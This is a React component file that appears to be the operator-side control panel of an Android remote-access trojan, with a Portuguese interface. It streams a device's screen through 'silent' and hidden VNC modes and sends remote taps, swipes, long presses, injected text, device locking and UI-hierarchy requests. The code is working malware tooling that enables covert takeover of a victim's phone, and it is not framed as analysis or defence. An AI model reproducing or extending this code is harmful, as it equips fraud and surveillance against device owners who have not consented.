import { useEffect, useRef, useState, useCallback } from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

export default function LiveScreen({ deviceId, onBack, sendCmd }) {
  const canvasRef  = useRef(null);
  const vncActive  = useStore(s => s.vncActive);
  const setVnc     = useStore(s => s.setVncActive);
  const [mode, setMode]       = useState('HVNC');
  const [quality, setQuality] = useState(75);
  const [fpsCount, setFpsCount] = useState(0);
  const [latMs, setLatMs]       = useState(0);
  const [touchVis, setTouchVis] = useState(true);
  const fpsRef       = useRef(0);
  const lastFrameRef = useRef(0);
  const touchStart   = useRef(null);
  const mouseDown    = useRef(null);
  const [typeText, setTypeText] = useState('');
  const [tapX, setTapX]         = useState('');
  const [tapY, setTapY]         = useState('');

  // FIX BUG 3: removed ws.startFpsCounter?.() — FPS tracked here in component
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      const blob = new Blob([buf], { type: 'image/jpeg' });
      const url  = URL.createObjectURL(blob);
      const img  = new Image();
      img.onload = () => {
        const c = canvasRef.current;
        if (!c) { URL.revokeObjectURL(url); return; }
        if (c.width  !== img.naturalWidth)  c.width  = img.naturalWidth;
        if (c.height !== img.naturalHeight) c.height = img.naturalHeight;
        c.getContext('2d').drawImage(img, 0, 0);
        URL.revokeObjectURL(url);
        fpsRef.current++;
        const now = Date.now();
        setLatMs(now - lastFrameRef.current);
        lastFrameRef.current = now;
      };
      img.src = url;
    });
    // FPS counter — update every second
    const fpsTimer = setInterval(() => {
      setFpsCount(fpsRef.current);
      fpsRef.current = 0;
    }, 1000);
    return () => { unsub(); clearInterval(fpsTimer); };
  }, [deviceId]);

  function startVnc() {
    sendCmd('START_SILENT_VNC');
    ws.subscribe('vnc', deviceId);
    setVnc(true);
  }
  function stopVnc() {
    sendCmd('STOP_SILENT_VNC');
    ws.unsubscribe('vnc', deviceId);
    setVnc(false);
  }

  // Touch input → TAP / SWIPE / LONG_PRESS
  const getScaledCoords = (clientX, clientY) => {
    const c = canvasRef.current;
    if (!c) return { x: 0, y: 0 };
    const r = c.getBoundingClientRect();
    return {
      x: Math.round((clientX - r.left) * (c.width  / r.width)),
      y: Math.round((clientY - r.top)  * (c.height / r.height)),
    };
  };

  const onTouchStart = useCallback(e => {
    e.preventDefault();
    const t = e.touches[0];
    touchStart.current = { ...getScaledCoords(t.clientX, t.clientY), ts: Date.now() };
  }, []);

  const onTouchEnd = useCallback(e => {
    e.preventDefault();
    if (!touchStart.current) return;
    const t = e.changedTouches[0];
    const end = getScaledCoords(t.clientX, t.clientY);
    const { x: sx, y: sy, ts } = touchStart.current;
    const dt = Date.now() - ts;
    const dist = Math.hypot(end.x - sx, end.y - sy);
    if (dist < 10) {
      if (dt > 600) sendCmd('LONG_PRESS', { x: sx, y: sy });
      else          sendCmd('TAP',        { x: sx, y: sy });
    } else {
      sendCmd('SWIPE', { x1: sx, y1: sy, x2: end.x, y2: end.y, duration: dt });
    }
    touchStart.current = null;
  }, [sendCmd]);

  const onMouseDown = e => {
    const r = canvasRef.current?.getBoundingClientRect();
    if (!r) return;
    mouseDown.current = { ...getScaledCoords(e.clientX, e.clientY), ts: Date.now() };
  };
  const onMouseUp = e => {
    if (!mouseDown.current) return;
    const end = getScaledCoords(e.clientX, e.clientY);
    const { x: sx, y: sy, ts } = mouseDown.current;
    const dist = Math.hypot(end.x - sx, end.y - sy);
    if (dist < 8) sendCmd('TAP', { x: sx, y: sy });
    else sendCmd('SWIPE', { x1: sx, y1: sy, x2: end.x, y2: end.y, duration: Date.now() - ts });
    mouseDown.current = null;
  };

  return (
    <div className="fade-up">
      {/* Header toolbar */}
      <div className="row-sb mb10">
        <div>
          <div className="bold txt-gold" style={{ fontSize: 13 }}>EDITAR V2 ✏</div>
          <div className="row gap6 txt-xs txt-dim mt4">
            <span>📷 LEITOR OCR</span>
            <span className="txt-gold">85%</span>
          </div>
        </div>
        <div className="row gap5" style={{ flexWrap: 'wrap', justifyContent: 'flex-end' }}>
          {['EDITAR V2','VNC','V2','DUPLO'].map(m => (
            <button key={m} onClick={() => setMode(m)}
              className={`btn btn-sm ${mode === m ? 'btn-blue' : 'btn-ghost'}`}
              style={{ padding: '4px 10px', fontSize: 11 }}>{m}</button>
          ))}
          <button className="btn btn-ghost btn-sm" onClick={onBack}>←</button>
        </div>
      </div>

      {/* Canvas */}
      <div className="vnc-wrap mb10"
        onTouchStart={onTouchStart} onTouchEnd={onTouchEnd}
        onMouseDown={onMouseDown}   onMouseUp={onMouseUp}
      >
        <canvas ref={canvasRef} className="vnc-canvas" width={360} height={720} />
        {!vncActive && (
          <div className="vnc-overlay">
            <div className="spin" />
            <div>Aguardando stream...</div>
          </div>
        )}
        {vncActive && (
          <div className="vnc-hud">
            {touchVis && (
              <span className="vnc-fps" style={{ background: 'rgba(200,20,20,.85)' }}>
                🎯 TOQUES: VISÍVEIS
              </span>
            )}
            <span className="vnc-fps" style={{ background: 'rgba(20,80,200,.85)' }}>{mode}</span>
            <span className="vnc-fps">{fpsCount} FPS · {latMs}ms</span>
          </div>
        )}
      </div>

      {/* Controls */}
      <div className="grid g2 mb8">
        <button className="btn btn-gold btn-block" onClick={startVnc}>▶ INICIAR</button>
        <button className="btn btn-red btn-block"  onClick={stopVnc}>⏹ PARAR</button>
        <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('FORCE_RESTART_VNC')}>↺ RESTART</button>
        <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('SNAP_SCREEN')}>📷 SNAP</button>
        <button className="btn btn-ghost btn-block btn-sm"
          onClick={() => setTouchVis(v => !v)}>
          {touchVis ? '👁 OCULTAR' : '👁 MOSTRAR'} TOQUES
        </button>
        <button className="btn btn-ghost btn-block btn-sm" onClick={() => sendCmd('REQUEST_HIERARCHY')}>🌳 HIERARCHY</button>
      </div>

      {/* Quality slider */}
      <div className="card card-sm mb8">
        <div className="row-sb mb6">
          <span className="txt-xs txt-dim">QUALIDADE</span>
          <span className="txt-xs txt-gold bold">{quality}%</span>
        </div>
        <input type="range" min="10" max="100" value={quality} style={{ width: '100%', accentColor: '#d4950a' }}
          onChange={e => {
            setQuality(+e.target.value);
            sendCmd('SET_SILENT_VNC_QUALITY', { quality: +e.target.value });
          }} />
      </div>

      {/* Nav keys */}
      <div className="section-title mt10">Navegação</div>
      <div className="grid g4 mb8">
        {[['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['⏻','POWER_MENU'],
          ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['💡','WAKEUP'],['🔒','LOCK_DEVICE']
        ].map(([icon, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{icon}</button>
        ))}
      </div>

      {/* Manual input */}
      <div className="section-title mt10">Toque manual</div>
      <div className="card card-sm mb8">
        <div className="txt-xs txt-dim mb6">TAP / LONG PRESS (x, y)</div>
        <div className="input-row mb8">
          <input className="input" placeholder="X" type="number" value={tapX}
            onChange={e => setTapX(e.target.value)} style={{ width: 80 }} />
          <input className="input" placeholder="Y" type="number" value={tapY}
            onChange={e => setTapY(e.target.value)} style={{ width: 80 }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => sendCmd('TAP', { x: +tapX, y: +tapY })}>TAP</button>
          <button className="btn btn-ghost btn-sm"
            onClick={() => sendCmd('LONG_PRESS', { x: +tapX, y: +tapY })}>HOLD</button>
        </div>
        <div className="txt-xs txt-dim mb6">DIGITAR TEXTO</div>
        <div className="input-row">
          <input className="input" placeholder="Texto para injetar..."
            value={typeText} onChange={e => setTypeText(e.target.value)}
            onKeyDown={e => { if (e.key === 'Enter') { sendCmd('TYPE', { text: typeText }); setTypeText(''); } }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }}>TYPE</button>
        </div>
      </div>
      <div style={{ height: 20 }} />
    </div>
  );
}
